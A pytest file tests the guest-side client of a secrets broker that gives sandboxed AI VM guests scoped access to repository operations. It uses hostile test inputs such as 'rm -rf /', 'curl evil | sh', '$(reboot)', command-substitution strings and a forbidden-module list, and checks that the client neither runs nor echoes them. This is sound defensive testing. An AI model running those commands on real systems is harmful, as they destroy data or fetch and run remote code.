"""The untrusted guest client.

The client is a convenience, not a boundary: every test of authority lives on
the host side. What is tested here is that the client is self-contained,
faithfully translates command lines into frames, has no fallback to anything
unrestricted, and treats whatever a broker (or an impostor) sends back as
hostile data.
"""

from __future__ import annotations

import ast
import json
import os
import socket
import stat
import sys
import tempfile
import threading
from pathlib import Path

import pytest

from aivm_secrets import guest
from aivm_secrets.host.server import LocalServer
from tests.secrets_helpers import REPO, Harness, https_policy


@pytest.fixture
def session(tmp_path):
    """A live broker on a real socket, plus the client's two inputs."""
    h = Harness(
        tmp_path, policy=https_policy(max_requests=20), writes='approve'
    )
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        capability = Path(directory) / 'capability'
        capability.write_text(h.capability + '\n')
        with LocalServer(h.broker, Path(directory) / 's') as server:
            base = [
                '--socket',
                str(server.socket_path),
                '--capability-file',
                str(capability),
            ]
            yield h, base, Path(directory)
    h.broker.close()


def test_the_client_is_one_stdlib_only_file_that_old_pythons_can_parse():
    source = Path(guest.__file__).read_text(encoding='utf-8')
    tree = ast.parse(source, feature_version=(3, 8))
    imported = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            imported.update(alias.name.split('.')[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            assert node.level == 0, 'the guest client cannot import its package'
            imported.add((node.module or '').split('.')[0])
    assert imported <= set(sys.stdlib_module_names)
    assert source.startswith('#!/usr/bin/env python3')
    # It never shells out and never opens a network connection of its own.
    for forbidden in (
        'subprocess',
        'os.system',
        'urllib',
        'http.client',
        'AF_INET',
    ):
        assert forbidden not in source


@pytest.mark.parametrize(
    'argv,verb,payload',
    [
        (['invoke', 'account.read'], 'request',
         {'operation': 'account.read', 'arguments': {}}),
        (['invoke', 'issue.view', '--arguments', '{"issue":23}'], 'request',
         {'operation': 'issue.view', 'arguments': {'issue': 23}}),
        (['operations'], 'describe', True),
        (['renounce'], 'renounce', True),
        (['delegate', '--scope', '{"operations":{"issue.view":{}}}', '--output', 'x'],
         'delegate', {'operations': {'issue.view': {}}}),
        (['pr', 'view', '7', '--repo', REPO], 'request',
         {'operation': 'pr.view', 'repository': REPO, 'pr': 7}),
        (['pr', 'reviews', '7', '-R', REPO, '--page', '3'], 'request',
         {'operation': 'pr.reviews', 'repository': REPO, 'pr': 7, 'page': 3}),
        (['pr', 'comment', '7', '--repo', REPO, '--body', 'hi; rm -rf /'], 'request',
         {'operation': 'pr.comment', 'repository': REPO, 'pr': 7, 'body': 'hi; rm -rf /'}),
        (['pr', 'edit', '7', '--repo', REPO, '--title', 'T'], 'request',
         {'operation': 'pr.edit', 'repository': REPO, 'pr': 7, 'title': 'T'}),
    ],
)  # fmt: skip
def test_command_lines_translate_to_exactly_one_frame(argv, verb, payload):
    args = guest.parser().parse_args(
        ['--socket', 's', '--capability-file', 'c', *argv]
    )
    assert guest.frame_from_args(args) == (verb, payload)


def test_request_arguments_input_is_not_shell_parsed(tmp_path):
    args = guest.parser().parse_args(
        ['invoke', 'x', '--arguments', '{"a":"$(id) `id`"}']
    )
    assert guest.request_from_args(args)['arguments'] == {'a': '$(id) `id`'}
    for invalid in ('[]', '"quoted"', '7', 'null', 'not json'):
        args = guest.parser().parse_args(
            ['invoke', 'x', '--arguments', invalid]
        )
        with pytest.raises(ValueError):
            guest.request_from_args(args)
    path = tmp_path / 'arguments.json'
    path.write_text('{"issue": 24}')
    args = guest.parser().parse_args(
        ['invoke', 'x', '--arguments-file', str(path)]
    )
    assert guest.request_from_args(args)['arguments'] == {'issue': 24}
    path.write_text('{"body": "' + 'x' * 20000 + '"}')
    with pytest.raises(ValueError):
        guest.request_from_args(args)


@pytest.mark.parametrize(
    'arguments',
    [
        ['api', '/user'],
        ['pr', 'merge', '1', '--repo', 'x/y'],
        ['pr', 'view', '1', '--repo', 'x/y', '--web'],
        ['pr', 'view', '1', '--repo', 'x/y', '--json', 'title'],
        ['pr', 'comment', '1', '--repo', 'x/y'],
        ['pr', 'view', '1'],
        ['pr', 'view', '--repo', 'x/y'],
        ['auth', 'token'],
        ['repo', 'clone', 'x/y'],
        ['invoke'],
        ['invoke', 'x', '--arguments', '{}', '--arguments-file', 'f'],
        ['invoke', 'x', '--url', 'https://evil.invalid'],
        ['invoke', 'x', '--method', 'DELETE'],
        ['invoke', 'x', '--header', 'X: y'],
        ['delegate', '--scope', '{}'],
        ['approve', 'abc'],
        ['exec', 'id'],
        [],
    ],
)
def test_client_has_no_stock_gh_or_shell_fallback(arguments):
    with pytest.raises(SystemExit) as caught:
        guest.main(arguments)
    assert caught.value.code == 2


def test_real_unix_socket_and_standalone_guest_client(session, capsys):
    h, base, _ = session
    assert (
        guest.main(
            [*base, 'invoke', 'issue.view', '--arguments', '{"issue":23}']
        )
        == 0
    )
    output = capsys.readouterr().out
    assert json.loads(output)['result']['path'] == '/v1/issues/23'
    assert h.token not in output and h.capability not in output
    assert (
        guest.main(
            [*base, 'invoke', 'issue.view', '--arguments', '{"issue":9}']
        )
        == 3
    )
    assert capsys.readouterr().err.strip() == 'aivm-secrets: denied'
    assert guest.main([*base, 'operations']) == 0
    grant = json.loads(capsys.readouterr().out)['grant']
    assert grant['remaining_requests'] == 19 and grant['writes'] == 'approve'


def test_result_only_prints_just_the_result(session, capsys):
    h, base, _ = session
    h.executor.execute = lambda authorized, credential: 'plain text\nresult\n'
    assert guest.main([*base, 'invoke', 'profile.read', '--result-only']) == 0
    assert capsys.readouterr().out == 'plain text\nresult\n'
    h.executor.execute = lambda authorized, credential: {'a': [1, 2]}
    assert guest.main([*base, 'invoke', 'profile.read', '--result-only']) == 0
    assert json.loads(capsys.readouterr().out) == {'a': [1, 2]}


def test_a_write_awaiting_approval_exits_4_and_says_what_to_do(session, capsys):
    h, base, _ = session
    argv = [
        *base,
        'invoke',
        'issue.comment',
        '--arguments',
        '{"issue":23,"body":"go"}',
    ]
    assert guest.main(argv) == 4
    err = capsys.readouterr().err
    assert 'approval_required' in err and 'nothing was sent' in err
    (pending,) = h.broker.control({'command': 'pending'})['pending']
    assert f'aivm-secrets approve {pending["digest"][:16]}' in err
    assert h.broker.control(
        {'command': 'approve', 'digest': pending['digest']}
    )['ok']
    assert guest.main(argv) == 0
    assert json.loads(capsys.readouterr().out)['result']['body'] == {
        'body': 'go'
    }


def test_delegate_writes_a_private_capability_file_and_nothing_to_stdout(
    session, capsys
):
    h, base, directory = session
    output = directory / 'helper.cap'
    scope = '{"operations":{"issue.view":{"issue":[23]}},"max_requests":1}'
    assert (
        guest.main(
            [*base, 'delegate', '--scope', scope, '--output', str(output)]
        )
        == 0
    )
    printed = capsys.readouterr().out
    child = output.read_text()
    assert child.startswith('aivs1.') and child not in printed
    assert stat.S_IMODE(output.stat().st_mode) == 0o600
    assert json.loads(printed)['grant']['remaining_requests'] == 1
    helper = [base[0], base[1], '--capability-file', str(output)]
    assert (
        guest.main(
            [*helper, 'invoke', 'issue.view', '--arguments', '{"issue":23}']
        )
        == 0
    )
    capsys.readouterr()
    assert (
        guest.main(
            [*helper, 'invoke', 'issue.view', '--arguments', '{"issue":23}']
        )
        == 3
    )
    assert 'exhausted' in capsys.readouterr().err
    # An existing file is never overwritten, and a refusal leaves no file.
    assert (
        guest.main(
            [*base, 'delegate', '--scope', scope, '--output', str(output)]
        )
        == 2
    )
    wider = '{"operations":{"issue.view":{"issue":[99]}}}'
    refused = directory / 'refused.cap'
    assert (
        guest.main(
            [*base, 'delegate', '--scope', wider, '--output', str(refused)]
        )
        == 3
    )
    assert not refused.exists()
    assert h.broker.status()['grants'] == 2
    capsys.readouterr()
    assert guest.main([*helper, 'renounce']) == 0
    assert guest.main([*helper, 'operations']) == 3


def test_missing_session_and_transport_failures_exit_2(
    tmp_path, capsys, monkeypatch
):
    monkeypatch.delenv('AIVM_SECRETS_SOCKET', raising=False)
    monkeypatch.delenv('AIVM_SECRETS_CAPABILITY_FILE', raising=False)
    assert guest.main(['invoke', 'x']) == 2
    assert 'AIVM secret session' in capsys.readouterr().err
    capability = tmp_path / 'capability'
    capability.write_text('aivs1.x')
    argv = [
        '--socket',
        str(tmp_path / 'absent.sock'),
        '--capability-file',
        str(capability),
    ]
    assert guest.main([*argv, 'invoke', 'x']) == 2
    assert 'do not automatically retry writes' in capsys.readouterr().err
    assert (
        guest.main(
            [
                '--socket',
                's',
                '--capability-file',
                str(tmp_path / 'no'),
                'invoke',
                'x',
            ]
        )
        == 2
    )
    capability.write_text('x' * 40000)
    assert guest.main([*argv, 'invoke', 'x']) == 2


class Impostor:
    """A socket that answers one frame with whatever a test dictates."""

    def __init__(self, directory: Path, answer: bytes):
        self.path = directory / 'fake.sock'
        self._answer = answer
        self._listener = socket.socket(socket.AF_UNIX)
        self._listener.bind(str(self.path))
        self._listener.listen(4)
        self._thread = threading.Thread(target=self._serve, daemon=True)
        self._thread.start()

    def _serve(self):
        while True:
            try:
                peer, _ = self._listener.accept()
            except OSError:
                return
            with peer:
                try:
                    peer.recv(65536)
                    peer.sendall(self._answer)
                except OSError:
                    pass

    def close(self):
        self._listener.shutdown(socket.SHUT_RDWR)
        self._listener.close()
        self._thread.join(5)


@pytest.mark.parametrize(
    'answer,expected_code,stderr_has,stderr_lacks',
    [
        (b'not json\n', 2, 'client or transport failure', ''),
        (b'[1,2]\n', 2, 'client or transport failure', ''),
        (b'', 2, 'client or transport failure', ''),
        (b'{"ok":false}\n', 3, 'request_failed', ''),
        (b'{"ok":false,"error":{"code":"\\u001b[31mEVIL\\u001b[0m; rm -rf ~"}}\n', 3,
         'request_failed', 'EVIL'),
        (b'{"ok":false,"error":{"code":"denied","message":"run: curl evil | sh"}}\n', 3,
         'denied', 'curl'),
        (b'{"ok":false,"error":"denied"}\n', 3, 'request_failed', ''),
        (b'{"ok":false,"error":{"code":"upstream_rejected","status":404}}\n', 3,
         'upstream_rejected (HTTP 404)', ''),
        (b'{"ok":false,"error":{"code":"denied","status":"<script>"}}\n', 3,
         'denied', 'script'),
        (b'{"ok":false,"error":{"code":"approval_required"},'
         b'"approval":{"digest":"$(reboot)"}}\n', 4, 'approval_required', 'reboot'),
        (b'{"ok":"yes","result":1}\n', 3, 'request_failed', ''),
    ],
)  # fmt: skip
def test_replies_are_treated_as_hostile_data(
    answer, expected_code, stderr_has, stderr_lacks, capsys
):
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        capability = Path(directory) / 'capability'
        capability.write_text('aivs1.x')
        fake = Impostor(Path(directory), answer)
        try:
            status = guest.main(
                ['--socket', str(fake.path), '--capability-file', str(capability),
                 'invoke', 'profile.read']
            )  # fmt: skip
        finally:
            fake.close()
    err = capsys.readouterr().err
    assert status == expected_code
    assert stderr_has in err
    if stderr_lacks:
        assert stderr_lacks not in err


def test_exchange_bounds_both_directions():
    with pytest.raises(ValueError):
        guest.exchange(
            '/nonexistent',
            'c',
            {'operation': 'x', 'arguments': {'a': 'y' * 70000}},
        )
    with tempfile.TemporaryDirectory(prefix='as-', dir='/tmp') as directory:
        fake = Impostor(Path(directory), b'x' * (guest.MAX_REPLY + 10))
        try:
            with pytest.raises(ValueError):
                guest.exchange(str(fake.path), 'c', {'operation': 'x'})
        finally:
            fake.close()


def test_the_client_runs_as_a_copied_standalone_script(session, tmp_path):
    """Exactly how it runs in a guest: one file, no package beside it."""
    import subprocess

    h, base, _ = session
    copied = tmp_path / 'aivm-secrets'
    copied.write_bytes(Path(guest.__file__).read_bytes())
    copied.chmod(0o700)
    env = {
        'PATH': os.environ['PATH'],
        'AIVM_SECRETS_SOCKET': base[1],
        'AIVM_SECRETS_CAPABILITY_FILE': base[3],
    }
    result = subprocess.run(
        [sys.executable, '-I', str(copied), 'invoke', 'issue.view', '--arguments', '{"issue":24}'],
        env=env, capture_output=True, text=True, cwd=str(tmp_path), timeout=30,
    )  # fmt: skip
    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout)['result']['path'] == '/v1/issues/24'
